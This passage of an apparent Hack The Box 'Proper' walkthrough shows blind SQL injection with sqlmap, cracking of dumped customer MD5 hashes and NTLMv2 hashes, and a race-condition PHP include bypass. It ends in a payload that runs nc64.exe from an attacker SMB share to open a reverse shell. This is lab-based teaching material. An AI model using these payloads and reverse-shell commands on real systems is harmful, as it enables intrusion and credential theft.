+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_order.sh <span class="s2">"(CASE WHEN (SELECT SUBSTRING(database(),1,1))='a' THEN id ELSE price END)"</span> | <span class="nb">tail</span> <span class="nt">-1</span>
+<span class="go">              &lt;h4&gt;&lt;a href="#"&gt;Deduper Pro&lt;/a&gt;&lt;/h4&gt;
+</span></code></pre></div></div>
+<p>“Deduper Pro” “means false. Trying more, it starts with <code class="language-plaintext highlighter-rouge">c</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_order.sh <span class="s2">"(CASE WHEN (SELECT SUBSTRING(database(),1,1))='b' THEN id ELSE price END)"</span> | <span class="nb">tail</span> <span class="nt">-1</span>
+<span class="go">              &lt;h4&gt;&lt;a href="#"&gt;Deduper Pro&lt;/a&gt;&lt;/h4&gt;
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_order.sh <span class="s2">"(CASE WHEN (SELECT SUBSTRING(database(),1,1))='c' THEN id ELSE price END)"</span> | <span class="nb">tail</span> <span class="nt">-1</span>
+<span class="go">              &lt;h4&gt;&lt;a href="#"&gt;Memdoubler Pro&lt;/a&gt;&lt;/h4&gt;
+</span></code></pre></div></div>
+<p>I can write a loop to check a given character, as this finds the second characters is <code class="language-plaintext highlighter-rouge">l</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">for </span>c <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do</span> ./test_order.sh <span class="s2">"(CASE WHEN (SELECT SUBSTRING(database(),2,1))=</span><span class="se">\"</span><span class="k">${</span><span class="nv">c</span><span class="k">}</span><span class="se">\"</span><span class="s2"> THEN id ELSE price END)"</span> | <span class="nb">tail</span> <span class="nt">-1</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"Memdoubler Pro"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">l
+</span></code></pre></div></div>
+<p>If I wanted to go much further like this, I’d script something. But I’ll use <code class="language-plaintext highlighter-rouge">sqlmap</code>.</p>
+<h4 id="sqlmap">SQLmap</h4>
+<p>In the default mode, <code class="language-plaintext highlighter-rouge">sqlmap</code> will fail here because any injection it tries will result in a 500 because of the hash. However, there’s a flag, <code class="language-plaintext highlighter-rouge">--eval</code> that works perfectly for this kind of thing. In fact, the <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage#evaluate-custom-python-code-during-each-request">example in the docs</a> has this case:</p>
+<blockquote>
+<p>In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option <code class="language-plaintext highlighter-rouge">--eval</code> that will be evaluated just before each request.</p>
+<p>For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b9238</span><span class="se">\</span><span class="s2">
+</span><span class="gp">‍</span><span class="s2">20dcc509a6f75849b"</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span>
+</code></pre></div> </div>
+<p>Each request of such run will re-evaluate value of GET parameter <code class="language-plaintext highlighter-rouge">hash</code> to contain a fresh MD5 hash digest for current value of parameter <code class="language-plaintext highlighter-rouge">id</code>.</p>
+</blockquote>
+<p>The only difference is that I need to add the salt, so <code class="language-plaintext highlighter-rouge">--eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b'</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"</span> <span class="nt">--threads</span> 10
+<span class="go">...[snip]...
+[</span><span class="sqlmap-timestamp">14:40:28</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Boolean-based blind - Parameter replace (original value)'
+[</span><span class="sqlmap-timestamp">14:40:29</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] GET parameter 'order' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=200)
+[</span><span class="sqlmap-timestamp">14:40:29</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'                                                     
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]   
+...[snip]...
+[</span><span class="sqlmap-timestamp">14:41:07</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] checking if the injection point on GET parameter 'order' is a false positive
+GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 314 HTTP(s) requests:
+---
+Parameter: order (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: order=(SELECT (CASE WHEN (9062=9062) THEN 'id desc' ELSE (SELECT 4887 UNION SELECT 3878) END))&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
+    Payload: order=id desc PROCEDURE ANALYSE(EXTRACTVALUE(7325,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4f447470))))),1)&amp;h=a1b30d31d344a5a4e41e849
+6ccbdd26b
+---
+[</span><span class="sqlmap-timestamp">14:41:39</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] the back-end DBMS is MySQL
+web server operating system: Windows 2016 or 10 or 2019
+web application technology: Microsoft IIS 10.0, PHP 7.4.1
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+</span></code></pre></div></div>
+<p>I’ll run a few more <code class="language-plaintext highlighter-rouge">sqlmap</code> commands to get a feel for the DB. Each one is slow because it’s having to brute force character by character.</p>
+<p>List DBs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b'</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"</span> <span class="nt">--dbs</span>
+<span class="go">...[snip]...
+available databases [3]:
+[*] cleaner
+[*] information_schema
+[*] test
+...[snip]...
+</span></code></pre></div></div>
+<p>Show tables in <code class="language-plaintext highlighter-rouge">cleaner</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b'</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"</span> <span class="nt">-D</span> cleaner <span class="nt">--tables</span>
+<span class="go">...[snip]...
+Database: cleaner
+[3 tables]
++-----------+
+| customers |
+| licenses  |
+| products  |
++-----------+
+...[snip]...
+</span></code></pre></div></div>
+<p>Dump <code class="language-plaintext highlighter-rouge">customers</code>, which has usernames and hashes (I’m adding in <code class="language-plaintext highlighter-rouge">--threads</code> this time, as it will take <em>forever</em> without it):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sqlmap <span class="nt">-u</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b'</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"</span> <span class="nt">-D</span> cleaner <span class="nt">-T</span> customers <span class="nt">--dump</span> <span class="nt">--threads</span> 10
+<span class="go">...[snip]...
+Database: cleaner
+Table: customers
+[29 entries]
++----+------------------------------+----------------------------------+----------------------+
+| id | login                        | password                         | customer_name        |
++----+------------------------------+----------------------------------+----------------------+
+| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c | Vikki Solomon        |
+| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 | Neave Stone          |
+| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e | Bertie McEachern     |
+| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b | Jordana Kleiser      |
+| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b | Mariellen Chasemore  |
+| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 | Gwyneth Dornin       |
+| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 | Israel Tootell       |
+| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a | Karon Mangham        |
+| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 | Janifer Blinde       |
+| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c | Laurens Lenchenko    |
+| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad | Andreana Austin      |
+| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 | Arnold Feldmesser    |
+| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd | Adella Huntar        |
+| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e | Trudi Alelsandrovich |
+| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 | Ivy Shay             |
+| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 | Alys Callaby         |
+| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 | Dorena Aery          |
+| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 | Amble Alekseicik     |
+| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 | Lin Ginman           |
+| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f | Letty Giorio         |
+| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee | Lazarus Bysh         |
+| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 | Bud Klewer           |
+| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 | Woodrow Strettell    |
+| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 | Lila O Doran         |
+| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd | Bibbie Pfeffel       |
+| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 | Luce Grimsdell       |
+| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f | Lyle Pealing         |
+| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 | Kimmy Russen         |
+| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d | Meg Eastmond         |
++----+------------------------------+----------------------------------+----------------------+
+</span></code></pre></div></div>
+<h3 id="crack-hashes">Crack Hashes</h3>
+<p>I’ll format those in a file like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vikki.solomon@throwaway.mail:7c6a180b36896a0a8c02787eeafb0e4c 
+</code></pre></div></div>
+<p>Now I can run them through <code class="language-plaintext highlighter-rouge">hashcat</code>, and they call break very quickly:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 0 db.hashes /usr/share/wordlists/rockyou.txt <span class="nt">--user</span>
+<span class="go">...[snip]...
+e10adc3949ba59abbe56e057f20f883e:123456          
+827ccb0eea8a706c4c34a16891f84e7b:12345           
+25f9e794323b453885f5181f1b624d0b:123456789       
+5f4dcc3b5aa765d61d8327deb882cf99:password        
+f25a2fc72690b780b2a14e140ef6a9e0:iloveyou        
+8afa847f50a716e64932d995c8e7435a:princess        
+fcea920f7412b5da7be0cf42b8c93759:1234567         
+f806fc5a2a0d5ba2471600758452799c:rockyou         
+25d55ad283aa400af464c76d713c07ad:12345678        
+e99a18c428cb38d5f260853678922e03:abc123          
+fc63f87c08d505264caba37514cd0cfd:nicole          
+aa47f8215c6f30a0dcdb2a36a9f4168e:daniel          
+67881381dbc68d4761230131ae0008f7:babygirl        
+d0763edaa9d9bd2a9516280e9044d885:monkey          
+061fba5bdfc076bb7362616668de87c8:lovely          
+aae039d6aa239cfc121357a825210fa3:jessica         
+c33367701511b4f6020ec61ded352059:654321          
+0acf4539a14b3aa27deeb4cbdf6e989f:michael         
+adff44c5102fca279fce7559abf66fee:ashley          
+d8578edf8458ce06fbc5bb76a58c5ca4:qwerty          
+96e79218965eb72c92a549dd5a330112:111111          
+edbd0effac3fcc98e725920a512881e0:iloveu          
+670b14728ad9902aecba32e22fa4f6bd:000000          
+2345f10bb948c5665ef91f6773b3e455:michelle        
+f78f2477e949bee2d12a2c540fb6084f:trigger          
+0571749e2ac330a7455809c6b0e7af90:sunshine        
+c378985d629e99a4e86213db0cd5e70d:chocolate       
+7c6a180b36896a0a8c02787eeafb0e4c:password1       
+6cb75f652a9b52798eb6cf2201057c73:password2  
+...[snip]...
+</span></code></pre></div></div>
+<p>All of these creds seem to work to login at the <code class="language-plaintext highlighter-rouge">/licenses</code> page.</p>
+<h2 id="shell-as-web">Shell as web</h2>
+<h3 id="enumeration-licenses">Enumeration /licenses</h3>
+<p>When logged in, it goes to <code class="language-plaintext highlighter-rouge">licenses.php</code>, which simply prints out a list of licenses associated with the given account:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226155251961.webp" type="image/webp"/>
+<img alt="image-20210226155251961" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226155251961.png"/>
+</picture>
+<p>The only interaction with the page is logging out, and the three links that change the theme between Darkly, Flatly, and Solar.</p>
+<p>Clicking on one, in addition to changing the color, adds two parameters to the GET request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.231/licenses/licenses.php?theme=flatly&amp;h=a48e169864f4b46a09d36664ec645f75
+</code></pre></div></div>
+<p>The salt is the same, so I don’t have to re-figure that out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoimflatly"</span> | <span class="nb">md5sum</span>
+<span class="go">a48e169864f4b46a09d36664ec645f75  -
+</span></code></pre></div></div>
+<p>If I change the theme to 0xdf (and generate the matching hash), the CSS doesn’t load:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210316125420900.webp" type="image/webp"/>
+<img alt="image-20210316125420900" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210316125420900.png"/>
+</picture>
+<p>But not only are the colors gone, but there’s an error dump in the HTML source:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226155612962.webp" type="image/webp"/>
+<img alt="image-20210226155612962" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226155612962.png"/>
+</picture>
+<h3 id="php-analysis">PHP Analysis</h3>
+<p>PHP has two ways to load a text file into a page, as PHP to be executed, or as text. <code class="language-plaintext highlighter-rouge">include</code> will include the contents and then execute them as PHP code. This is useful to include something like a database connection. It’s also risky because if a user can get content into that include, it will execute (a file include vulnerability). <code class="language-plaintext highlighter-rouge">file_get_contents</code> returns the contents of a file to PHP as a string. Just loading user text this way isn’t inherently dangerous (though the following PHP could do dangerous things with it).</p>
+<p>The <code class="language-plaintext highlighter-rouge">secure_include</code> function in the dump is interesting. This function calls <code class="language-plaintext highlighter-rouge">file_get_contents</code> first to load the contents of the file, and checks for any instances of <code class="language-plaintext highlighter-rouge">&lt;?</code>. If none are found, it’s then the same file is opened with <code class="language-plaintext highlighter-rouge">include</code>. The developer of the page is checking to make sure no PHP code is passed into the include. A safer way to do this would be to just <code class="language-plaintext highlighter-rouge">echo</code> the results of the <code class="language-plaintext highlighter-rouge">file_get_contents</code> onto the page.</p>
+<p>There are two challenges. First, I need a way to get a file I control passed into the machine. I haven’t found any upload services on this site yet. Second, I need a way to make it so that I can get PHP code past that check for <code class="language-plaintext highlighter-rouge">&lt;?</code>.</p>
+<p>For the first, I’ll look at remote file include possibilities, first over HTTP, and then over SMB. For the latter, because the site is fetching the data twice, there is a potential time of check / time of use vulnerability. If I can change the contents of the file between when it’s read with <code class="language-plaintext highlighter-rouge">file_get_contents</code> and when it’s opened with <code class="language-plaintext highlighter-rouge">include</code>, I can run PHP code.</p>
+<p>I’ll also note that passing theme <code class="language-plaintext highlighter-rouge">0xdf</code> leads to loading the file <code class="language-plaintext highlighter-rouge">0xdf/header.inc</code>.</p>
+<h3 id="rfi">RFI</h3>
+<h4 id="http">HTTP</h4>
+<p>I’ll check out remote file includes by passing in a url. I’ll make my own theme and hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoimhttp://10.10.14.10/0xdfly"</span> | <span class="nb">md5sum</span>
+<span class="go">a0bd246564f657e7b152de721fa17b9f
+</span></code></pre></div></div>
+<p>On visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.231/licenses/licenses.php?theme=http://10.10.14.10/0xdfly&amp;h=a0bd246564f657e7b152de721fa17b9f</code>, I get a hit on my Python webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+[10.10.10.231 - - [26/Feb/2021 16:05:40] code 404, message File not found
+10.10.10.231 - - [26/Feb/2021 16:05:40] "GET /0xdfly/header.inc HTTP/1.0" 404 -
+</span></code></pre></div></div>
+<p>It’s appending <code class="language-plaintext highlighter-rouge">header.inc</code> in the folder matching the theme. I’ll create the folder and the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">mkdir </span>0xdfly
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> 0xdfly/header.inc
+</code></pre></div></div>
+<p>On refreshing, there’s a request at my webserver and it returns the file, but there’s a new error in the page:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
+On line 36 in file C:\inetpub\wwwroot\functions.php
+ 31 | // Following function securely includes a file. Whenever we 
+ 32 | // will encounter a PHP tag we will just bail out here. 
+ 33 | function secure_include($file) { 
+ 34 |   if (strpos(file_get_contents($file),'&lt;?') === false) { 
+ 35 |     include($file);                &lt;&lt;&lt;&lt;&lt; Error encountered in this line.
+ 36 |   } else { 
+ 37 |     http_response_code(403); 
+ 38 |     die('Forbidden - Tampering attempt detected.'); 
+ 39 |   } 
+ 40 | } 
+ 41 |  
+// --&gt;</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">file_get_contents</code> worked, but HTTP includes are disabled.</p>
+<h4 id="smb">SMB</h4>
+<p>Because this is a Windows box, I’ll try SMB, by generating the hash:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoim</span><span class="se">\\\\</span><span class="s2">10.10.14.10</span><span class="se">\\</span><span class="s2">share"</span> | <span class="nb">md5sum</span>
+<span class="go">adbde0da04f46e54a67eb5c14bd6a1ae  -
+</span></code></pre></div></div>
+<p>And then visiting <code class="language-plaintext highlighter-rouge">http://10.10.10.231/licenses/licenses.php?theme=\\10.10.14.10\share&amp;h=adbde0da04f46e54a67eb5c14bd6a1ae</code> with a Python SMB server started (<code class="language-plaintext highlighter-rouge">sudo smbserver.py share .</code>). I see it trying to connect, but failing, and then the page reports it failed to get the file. But I do capture a bunch of hashes for the user, web:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] web::PROPER:aaaaaaaaaaaaaaaa:9b66db9833525f0016ac228a9a9acb97:010100000000000000115ce0860cd70194b40cb0153cb53400000000010010004600750061004d005500620042007300030010004600750061004d005500620042007300020010006300700049006300610074007100680004001000630070004900630061007400710068000700080000115ce0860cd701060004000200000008003000300000000000000000000000002000008bcec302c2054104d6792676517675e353a03a9488d052b679a796aef6639e0c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000
+</code></pre></div></div>
+<p>These are Net-NTLMv2 hashes, and it cracks with <code class="language-plaintext highlighter-rouge">hashcat</code> and <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>hashcat <span class="nt">-m</span> 5600 web.ntlmv2 /usr/share/wordlists/rockyou.txt 
+<span class="go">...[snip]...
+WEB::PROPER:56c81e47981ecdcf:873c9c6ebad4311d8c6e784bd80c4cb7:0101000000000000c0653150de09d201f2fb407cc2690225000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000000000000002000008bcec302c2054104d6792676517675e353a03a9488d052b679a796aef6639e0c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:charlotte123!
+...[snip]...
+</span></code></pre></div></div>
+<p>Now I have the password, “charlotte123!”, and I can use that to start an SMB server that Proper will connect to:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>smbserver.py share <span class="nb">.</span> <span class="nt">-user</span> web <span class="nt">-password</span> <span class="s1">'charlotte123!'</span> <span class="nt">-smb2support</span>
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</span></code></pre></div></div>
+<p>On refreshing Firefox, it gets the my <code class="language-plaintext highlighter-rouge">header.inc</code> and includes it without error:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226163536790.webp" type="image/webp"/>
+<img alt="image-20210226163536790" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226163536790.png"/>
+</picture>
+<h3 id="bypass-check">Bypass Check</h3>
+<p>Now that I can get a file included, I need to bypass the check for <code class="language-plaintext highlighter-rouge">&lt;?</code> in the contents. What’s useful to me here is that it is read twice. In playing around trying to get the include to work, I noticed there was a slight lag between the two sets of activity on the SMB server.</p>
+<p><a href="https://github.com/inotify-tools/inotify-tools">inotify-tools</a> is an awesome set of tools to monitoring for file access (<code class="language-plaintext highlighter-rouge">apt install inotify-tools</code>). I used <code class="language-plaintext highlighter-rouge">incron</code> (similar package) to automate some stuff on <a href="/2021/06/05/htb-scriptkiddie.html#incron">ScriptKiddie</a>. <code class="language-plaintext highlighter-rouge">inotify-wait</code> will hang until a file is accessed, and then return. So my first attempt to trick this page was to echo an ok string into <code class="language-plaintext highlighter-rouge">header.inc</code>, then <code class="language-plaintext highlighter-rouge">inotify-wait</code> for the file to be read the first time, and then replace the contents with a PHP payload. On refreshing the page, it runs:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"dummy header"</span> <span class="o">&gt;</span> header.inc<span class="p">;</span> inotifywait <span class="nt">-e</span> CLOSE header.inc<span class="p">;</span> <span class="nb">echo</span> <span class="s1">'&lt;?php echo "it worked!";?&gt;'</span> <span class="o">&gt;</span> header.inc
+<span class="go">Setting up watches.
+Watches established.
+header.inc CLOSE_NOWRITE,CLOSE 
+</span></code></pre></div></div>
+<p>It didn’t work.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226164303521.webp" type="image/webp"/>
+<img alt="image-20210226164303521" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226164303521.png"/>
+</picture>
+<p>At first I thought it was too slow. But on thinking about it, the error means that either the hash was mismatched (which isn’t the case), or that the <code class="language-plaintext highlighter-rouge">file_get_contents</code> read is seeing the <code class="language-plaintext highlighter-rouge">&lt;?</code>. Does that mean that as soon as the SMB server starts to open it, I’m replacing the contents with the PHP. What if I try a sleep?</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"dummy header"</span> <span class="o">&gt;</span> header.inc<span class="p">;</span> inotifywait <span class="nt">-e</span> CLOSE header.inc<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">echo</span> <span class="s1">'&lt;?php echo "it worked!";?&gt;'</span> <span class="o">&gt;</span> header.inc
+<span class="go">Setting up watches.
+Watches established.
+header.inc CLOSE_NOWRITE,CLOSE 
+</span></code></pre></div></div>
+<p>It worked!</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226165626776.webp" type="image/webp"/>
+<img alt="image-20210226165626776" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226165626776.png"/>
+</picture>
+<h3 id="shell">Shell</h3>
+<p>I’ll turn this into a shell by replacing the PHP code with something to run <code class="language-plaintext highlighter-rouge">nc.exe</code> from my host:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"dummy header"</span> <span class="o">&gt;</span> header.inc<span class="p">;</span> inotifywait <span class="nt">-e</span> CLOSE header.inc<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">echo</span> <span class="s1">'&lt;?php system("\\\\10.10.14.10\\share\\nc64.exe -e cmd 10.10.14.10 443");?&gt;'</span> <span class="o">&gt;</span> header.inc
+<span class="go">Setting up watches.
+Watches established.
+header.inc CLOSE_NOWRITE,CLOSE 
+</span></code></pre></div></div>
+<p>On refresh, it takes a minute, but I get a shell at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 55748
+Microsoft Windows [Version 10.0.17763.1728]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\licenses&gt;
+</span></code></pre></div></div>
+<p>I can now access <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\web\desktop&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="go">01953ac7************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>I uploaded <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a> over SMB to the box and ran it. In the services section, one jumped out as unusual to me:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-
+...[snip]...
+    Cleanup(Iain Patterson - Cleanup)["C:\Program Files\nssm.exe"] - Autoload
+    Cleanup service
+...[snip]...
+</code></pre></div></div>
